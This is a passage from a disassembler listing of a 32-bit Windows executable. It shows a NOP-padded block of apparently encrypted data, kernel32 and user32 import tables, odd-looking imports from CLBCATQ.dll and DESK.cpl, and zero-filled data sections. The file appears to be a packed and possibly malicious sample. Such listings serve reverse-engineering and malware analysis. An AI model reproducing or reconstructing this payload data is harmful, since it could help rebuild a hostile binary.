sub_401FCB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)
		dd 297DAC1Ah, 98DF840Bh, 6314BF02h, 0D68EDE1Dh,	702F12F9h
		dd 0A611D635h, 0A6F760A0h, 854B1DDBh, 56CE6318h, 6DD785C8h
		dd 55706633h, 0E2FBB750h
		db 38h,	0Ah
word_40209A	dw 0E250h		; DATA XREF: sub_401D85+17o
		dd 15C616B5h, 779CF4A5h, 5207DF24h, 202769B3h, 45F00CAAh
		dd 0E185DC09h, 1DA606BFh, 72ACFCA0h, 2C9292EAh,	98E8E9F7h
		dd 0B4F7F768h, 260554A3h, 0F25E8079h, 5F5C96C2h, 520DF7A2h
		dd 0D7F954A7h, 0C0F955B0h, 2089480Fh, 0E546B8F8h, 0EDCB43Dh
		dd 6B7A52E1h, 54C2D692h, 4B8190FDh, 1C279AECh, 5A5B9EF6h
		dd 0C33395CDh, 74E5886Dh, 0B093C4D1h, 9AFC8597h, 7BEA2299h
		dd 17FB5018h, 7DD85747h, 0C5981AE5h, 5E1E0B51h,	5100FABFh
		dd 0DEA3EAA0h, 11180AAFh, 30450A7h, 7F9CDDA5h, 0CE01912Dh
		dd 98F9081Eh, 0BA2835F0h, 0C7DEE507h, 221A763Fh, 4D4FC4E0h
		dd 0B0FC5217h, 0A886D0DCh, 31F47F91h, 6010C037h, 5061A04Fh
		dd 0AF33A5D7h, 0B40E8313h, 266326C3h, 21CDC4F2h, 0C6EA6DABh
		dd 49E0C881h, 0B18EF317h, 0ABE26E8Ch, 7119C8B9h, 4EF7A8DFh
		dd 0EFC522F6h, 9F128E84h, 252B10F6h, 22430296h,	6F46831Fh
		dd 0C8DCBEA0h, 9BE4F120h, 0B01897C5h, 92480489h, 362F54BFh
		dd 4F3C61F6h, 0AF352607h, 24713C87h, 0ED2606B0h, 954508FDh
		dd 72267F4Fh, 0D20539E5h, 4E0C8364h, 51FCD28Fh,	0DECB4DC8h
		dd 25E1E47Bh, 0AF03CE47h, 0AE066067h, 9137448Ch, 38E4624Bh
		dd 0AB199765h, 2D691C71h, 0E1CE71C7h, 0A010C630h, 0B3041C72h
		dd 0B24E4DC1h, 78292BF3h, 0AE3DBB5Dh, 28387355h, 9F3CD2ABh
		dd 5BD4EE6Ah, 0C661142Ah, 2925758Fh, 0B370A690h, 8F798EE0h
		dd 39C3399Bh, 0E49EE51Ah, 8E18E572h, 0B8F38D86h, 2FDCA1B2h
		dd 0D1823B22h, 18BEE679h, 0A4D68C27h, 694B9ECh,	8C1E395h
		dd 54D81A76h, 0E19866DDh, 9BABB791h, 7CAD4843h,	0EA1AE71Ah
		dd 837C8375h, 5B32475Dh, 6928D3B7h, 0D860B624h,	14E84651h
		dd 0B616DCD7h, 0AD6D1AC4h, 92DDC89Ch, 0B7911E28h, 2E103A48h
		dd 4A140750h, 0DF33E4A8h, 923E0DABh, 0B9E151A2h, 0B304572Eh
		dd 0EE21D8F3h, 89EF378Ah, 3087643Ah, 9B0C5207h,	3E5A9ABCh
		dd 9D48B695h, 0B25C5B40h, 1D56D25Fh, 65D80A45h,	0D3A07969h
		dd 9A1A384Ah, 88F23BD5h, 0B1476719h, 7DDBA377h,	4DE87E44h
		dd 0CD8ED154h, 9F6695E1h, 5CC82ACFh, 0B06A768Fh, 921F1509h
		dd 3647C67Fh, 70322916h, 0D8A7707Bh, 0A4F2D352h, 8589CAE3h
		dd 0B27BA03Bh, 27C2D8FDh, 71141381h, 0CAF93ACCh, 9A8361BEh
		dd 27BD9FA0h, 42A04454h, 0BF9B88DEh, 0FA0A99F0h, 5A4C035Bh
		dd 0ABE65451h, 96A19C5Ah, 15729362h, 0E85289DAh, 0B7133116h
		dd 777B9BCAh, 0C557B62Ah, 2C5F24EAh, 6AD06E2Fh,	4B387F73h
		dd 0D168C046h, 984D23ECh, 27DC6E09h, 708A54A9h,	8C4626A6h
		dd 8A2F3DFDh, 3B50656Bh, 3AD7CD5Ah, 339901D6h, 671B837Fh
		dd 24F23E50h, 6EAAE559h, 48AA8D63h, 31A9C5A4h, 9504773Ah
		dd 414F8C8Eh, 0E3C20B81h, 4FD1FF28h, 82FDADD2h,	47F55917h
		dd 5D955299h, 59C957B3h, 61F54308h, 218982C0h, 20BA8EF2h
		dd 70B2B8EFh, 0B029FA88h, 0D8EA52C0h, 149AD707h, 0FA33EB7Ch
		dd 3F60A65h, 8BDAF9CDh,	159ED918h, 0FB08EBCDh, 0E47CFFE2h
		dd 15ACE0D1h, 83A77244h, 4A6F4A12h, 14BBE6DFh, 76A20CA1h
		dd 44AEE597h, 0DEC84734h, 0F283DC65h, 0DDBE11CCh, 92A0FED2h
		dd 0B6866896h, 7548CBB4h, 0FFFFCEB1h, 818018B0h, 3FBFBB8Fh
		dd 6C9EAE38h, 0C96F91AEh, 5CFC3728h, 0D94AA5BCh, 0A1FEB1E2h
		dd 0DCA4AB0Fh, 83236AFCh, 0FAE5D5DAh, 4D9089D7h, 8E439889h
		dd 39E8ECDFh, 79738990h, 53C63B37h, 0B5F2EF1Bh,	268F41C3h
		dd 72A05F1Eh, 20AFD070h, 0EFA797B0h, 2D20BE27h,	3BB30208h
		dd 1CC467BDh, 0F29DCC42h, 40E18E26h, 608F38EFh,	89E0D7D0h
		dd 0BC8F9438h, 0DBD8AA2Bh, 9393AAEEh, 70CE9ED0h, 0C898B0D8h
		dd 0D5C41BDBh, 969DF216h, 6EB97B3Ch, 0C9A342A2h, 27AED2F6h
		dd 4D6BF046h, 5B3A5D68h, 18CD633Eh, 0DCE6D9D9h,	0F10919Eh
		dd 7C6BB789h, 4D22993Ch, 1A7413A7h, 0B94F0BA1h,	2892CC6Bh
		dd 0D4B699CAh, 96A4B4C0h, 389DA8F9h, 9F79577Bh,	3E38ACB7h
		dd 64401EA7h, 9B0B4D29h, 0A7C3DEC7h, 60EEBDA7h,	5333FBEEh
		dd 0BAC805F2h, 26FCC068h, 0E181EC49h, 10CEF1EDh, 0F5238709h
		dd 7AEDC1CFh, 6671CA1Eh, 0AEC71AF1h, 0FE9BD34Ah, 0C8AA196h
		dd 3F45FBAAh, 0C92D527Bh, 9CF556C2h, 72DB53F1h,	0BF1DA660h
		dd 59D9D1C3h, 1C93171Eh, 12DAB8FAh, 3209C0Eh, 0FFEFB6B6h
		dd 992988A4h, 0BFEB3BADh, 89DB8E99h, 3C9E38B3h,	0A206E2F9h
		dd 3EB49B10h, 30310279h, 0DDB774Fh, 7AAAE5BDh, 83398D21h
		dd 9FA69A9Bh, 33CD9F33h, 0B013066h, 0AEFF67CFh,	1380B70Eh
		dd 9315A381h, 0A4A06CAh, 860F529Ah, 40147AF7h, 6080FEC4h
		dd 0D0BF815Eh, 1914FFD5h, 7348D45Bh, 8760CE28h,	3C237E61h
		dd 266F5925h, 0EDC85592h, 26C049BFh, 0D5009E81h, 16001D2Bh
		dd 237463D2h, 0E233367Bh, 8E3AC838h, 0F967A039h, 83203858h
		dd 0FF74E429h, 12FDB5Fh, 74567BB8h, 3D3B2A8Ah, 0B236DD2Bh
		dd 0AAECE769h, 1B14990Fh, 0B36007C9h, 26260385h, 0BD450A93h
		dd 0A947CB0Ah, 0AC0302D0h, 66897E97h, 0DF82C1D8h, 7BBE9F13h
		dd 0E794097Dh, 387C8688h, 14BB3B49h, 0A1FB0CC4h, 0AF2D3D4Eh
		dd 2C416DAEh, 2D4055EDh, 3FB0D462h, 61A834B7h, 153942A4h
		dd 0FAA3E21Eh, 13D25379h, 0F796D6A0h, 5B494AFh,	0FEA5B610h
		dd 3413E7F7h, 33B072FAh, 0CD552CDDh, 0A24A39C4h, 0BFDDD19Eh
		dd 8E7C1730h, 0BDC052F5h, 2D914C84h, 0A41D9434h, 0E27E7B36h
		dd 0F56E2882h, 0E63EBBF1h, 5613F3CAh, 4DB8315Ch, 0C5A65B56h
		dd 0A16D064Ch, 89C65F9Bh, 0A41A5BF5h, 2E5AD66Fh, 40D294D8h
		dd 3595B5FEh, 0E7A5B011h, 0DAE2CE3h, 62A5748Eh,	4FAD46BDh
		dd 2EA8AFF8h, 51AC1224h, 0D8A9F76Eh, 941507B2h,	0B65D7D90h
		dd 7C514137h, 0C3FBB563h, 9F832A12h, 94F2DF6h, 0D0D43A04h
		dd 0D42044A0h, 0CE3D2AB3h, 54BF3755h, 62C0EAEEh, 0C180ECD1h
		dd 5C9FA570h, 804B9A26h, 639B0789h, 3C8B1884h, 2BB88B6Bh
		dd 0D7EA3FF5h, 9893099Fh, 1A70223Bh, 8F07EFF9h,	1B79304h
		dd 0BF31FE60h, 34E9272Ch, 668C23A9h, 4DB9EE2Bh,	0DAA308EAh
		dd 93AE7B8Ah, 0B7A8C23Ah, 0A5AB9EE2h, 0AEAA308Eh, 0B7AAE7B8h
		dd 0FBAA8C23h, 87AAB9F2h, 2D91A306h, 18B78881h,	0D24EB41Ah
		dd 6787662Bh, 6E1CA94Dh, 29h dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 000B7000 ( 749568.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 0004FC00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 403000h
; BOOL __stdcall PulseEvent(HANDLE hEvent)
PulseEvent	dd ?
; DWORD	__stdcall GetTickCount()
GetTickCount	dd ?			; DATA XREF: sub_401382+9r
					; sub_4015F8+1Br ...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
LocalFree	dd ?			; DATA XREF: sub_401465+11r
					; sub_4016B0+1Br
; LPWSTR __stdcall GetCommandLineW()
GetCommandLineW	dd ?			; DATA XREF: sub_401561+25r
					; sub_401B94+2Er ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
GetModuleHandleA dd ?			; DATA XREF: sub_4010C3+3o
					; sub_401854+1Fr ...
; BOOL __stdcall LocalUnlock(HLOCAL hMem)
LocalUnlock	dd ?			; DATA XREF: sub_401133+18r
					; sub_4011BC+2Fr ...
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
UnmapViewOfFile	dd ?			; DATA XREF: sub_40134C+2Fr
					; sub_4016D2+1Cr
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
CreateFileA	dd ?
; void __stdcall SetLastError(DWORD dwErrCode)
SetLastError	dd ?			; DATA XREF: sub_4013D9+Br
					; sub_4014C0+Dr
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
HeapCreate	dd ?
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
GetSystemTime	dd ?
; BOOL __stdcall CloseHandle(HANDLE hObject)
CloseHandle	dd ?			; DATA XREF: sub_40139C+36r
					; sub_401428+36r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
Sleep		dd ?			; DATA XREF: sub_40161A+24r
					; sub_401EB4+24r ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
CreateThread	dd ?
; BOOL __stdcall SetEvent(HANDLE hEvent)
SetEvent	dd ?			; DATA XREF: sub_401090+2Cr
					; sub_401110+1Cr ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
LoadLibraryW	dd ?			; DATA XREF: start+25r	sub_401D40+31o	...
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
GetCurrentDirectoryA dd	?
; int __stdcall	lstrlenA(LPCSTR	lpString)
lstrlenA	dd ?			; DATA XREF: sub_40131B+1Fr starto ...
; DWORD	__stdcall GetConsoleTitleA(LPSTR lpConsoleTitle, DWORD nSize)
GetConsoleTitleA dd ?			; DATA XREF: start+Cr
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
GetComputerNameA dd ?
		dd 0
;
; Imports from USER32.dll
;
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
CreateWindowExA	dd ?
; BOOL __stdcall IsWindow(HWND hWnd)
IsWindow	dd ?			; DATA XREF: sub_40194C+Br
; HDC __stdcall	GetDC(HWND hWnd)
GetDC		dd ?			; DATA XREF: sub_4011F2+Fr
					; sub_4012F8+1Cr ...
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
CallWindowProcA	dd ?
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
DispatchMessageA dd ?
; SHORT	__stdcall GetKeyState(int nVirtKey)
GetKeyState	dd ?
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
GetDlgItem	dd ?
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
FillRect	dd ?
; HWND __stdcall SetFocus(HWND hWnd)
SetFocus	dd ?
; BOOL __stdcall DrawMenuBar(HWND hWnd)
DrawMenuBar	dd ?
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
CheckRadioButton dd ?
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
DrawEdge	dd ?
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
GetScrollBarInfo dd ?
		dd 0
;
; Imports from CLBCATQ.dll
;
DowngradeAPL	dd ?
SetSetupOpen	dd ?
SetupOpen	dd ?
UpdateFromAppChange dd ?
CheckMemoryGates dd ?
		dd 0
;
; Imports from DESK.cpl
;
InstallScreenSaver dd ?
		dd 0
		dd 3110h, 2 dup(0)
		dd 32F6h, 3000h, 3164h,	2 dup(0)
		dd 33C6h, 3054h, 319Ch,	2 dup(0)
		dd 3428h, 308Ch, 31B4h,	2 dup(0)
		dd 344Ah, 30A4h, 5 dup(0)
		dd 31BCh, 31CAh, 3252h,	3276h, 3288h, 320Ah, 32B4h, 3238h
		dd 32C6h, 31E8h, 32E6h,	31DAh, 329Ch, 32D6h, 3246h, 32A4h
		dd 325Eh, 3218h, 3224h,	31F6h, 0
		dd 3366h, 332Ch, 3324h,	3312h, 3344h, 3304h, 3358h, 338Ch
		dd 33ACh, 33B8h, 3378h,	3338h, 3398h, 0
		dd 3418h, 33FCh, 340Ch,	33D2h, 33E8h, 0
		dd 3434h, 0
		dd 7550039Bh, 4565736Ch, 746E6576h, 1C70000h, 54746547h
		dd 436B6369h, 746E756Fh, 540000h, 736F6C43h, 6E614865h
		dd 656C64h, 654804F1h, 72437061h, 65746165h, 18E0000h
		dd 43746547h, 75706D6Fh, 4E726574h, 41656D61h, 34F0000h
		dd 61636F4Ch, 6C6E556Ch, 6B636Fh, 736C054Eh, 656C7274h
		dd 416Eh, 654701B7h, 6E6F4374h,	656C6F73h, 6C746954h, 4165h
		dd 7243008Ah, 65746165h, 656C6946h, 45A0041h, 45746553h
		dd 746E6576h, 3490000h,	61636F4Ch, 6572466Ch, 1C00065h
aGetcurrentdire	db 'GetCurrentDirectoryA',0
		align 2
		dw 188h
aGetcommandline	db 'GetCommandLineW',0
		dd 65470177h, 646F4D74h, 48656C75h, 6C646E61h, 4165h, 6C5304B3h
		dd 706565h, 6F4C033Dh, 694C6461h, 72617262h, 5779h, 6E5504D7h
		dd 5670616Dh, 4F776569h, 6C694666h, 4740065h, 4C746553h
		dd 45747361h, 726F7272h, 0B70000h, 61657243h, 68546574h
		dd 64616572h, 2790000h,	53746547h, 65747379h, 6D69546Dh
		dd 454B0065h, 4C454E52h, 642E3233h, 6C6Ch, 65470722h, 79654B74h
		dd 74617453h, 5FB0065h,	6C6C6143h, 646E6957h, 7250776Fh
		dd 41636Fh, 65470706h, 434474h,	734907C0h, 646E6957h, 776Fh
		dd 724406A8h, 64457761h, 6567h,	69440693h, 74617073h, 654D6863h
		dd 67617373h, 4165h, 6547070Ch,	676C4474h, 6D657449h, 6520000h
		dd 61657243h, 69576574h, 776F646Eh, 417845h, 68430626h
		dd 526B6365h, 6F696461h, 74747542h, 6E6Fh, 694606DBh, 65526C6Ch
		dd 7463h
aYGetscrollbari	db 'Y',7,'GetScrollBarInfo',0
		align 4
		dd 65530711h, 636F4674h, 7375h,	724406AEh, 654D7761h, 6142756Eh
		dd 53550072h, 32335245h, 6C6C642Eh, 60000h
aUpdatefromappc	db 'UpdateFromAppChange',0
		db 9,0
aCheckmemorygat	db 'CheckMemoryGates',0
		align 4
		db  1Dh
		align 2
aSetsetupopen	db 'SetSetupOpen',0
		align 4
		db  1Fh
		align 2
aSetupopen	db 'SetupOpen',0
		db    4
		align 2
aDowngradeapl	db 'DowngradeAPL',0
		align 4
aClbcatq_dll	db 'CLBCATQ.dll',0
		db    6
		align 2
aInstallscreens	db 'InstallScreenSaver',0
		align 2
aDesk_cpl	db 'DESK.cpl',0
		align 4
		dd 6Bh dup(0)
		dd 2DA80h dup(?)
_rdata		ends

; Section 3. (virtual address 000BA000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00050200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 4BA000h
		dd 0Bh dup(20202020h)
dword_4BA02C	dd 0Eh dup(20202020h)	; DATA XREF: sub_401B94+8o
dword_4BA064	dd 0Eh dup(20202020h)	; DATA XREF: sub_401F04+8o
dword_4BA09C	dd 0Eh dup(20202020h)	; DATA XREF: sub_4011BC+8o
dword_4BA0D4	dd 0Ah dup(20202020h)	; DATA XREF: sub_401540+8o
aE		db '    e',0            ; DATA XREF: sub_401090+8o
		db 'f',0
aSaduDll:
		unicode	0, <sadu*dll>,0
		align 4
dword_4BA118	dd 2 dup(0)		; DATA XREF: sub_401BE8+8o
dword_4BA120	dd 18h dup(0)		; DATA XREF: sub_401428+8o
dword_4BA180	dd 0			; DATA XREF: sub_401C64+8o
dword_4BA184	dd 0Bh dup(0)		; DATA XREF: sub_4018BC+8o
dword_4BA1B0	dd 3 dup(0)		; DATA XREF: sub_401110+8o
dword_4BA1BC	dd 9 dup(0)		; DATA XREF: sub_401B18+8o
dword_4BA1E0	dd 3 dup(0)		; DATA XREF: sub_401EB4+8o
dword_4BA1EC	dd 38h dup(0)		; DATA XREF: sub_401F7C+8o
dword_4BA2CC	dd 20h dup(0)		; DATA XREF: sub_401274+8o
dword_4BA34C	dd 9 dup(0)		; DATA XREF: sub_4017C8+8o
dword_4BA370	dd 15h dup(0)		; DATA XREF: sub_401D40+Bo
dword_4BA3C4	dd 8Fh dup(0)		; DATA XREF: sub_4012F8+8o
		align 1000h
_data		ends


		end start
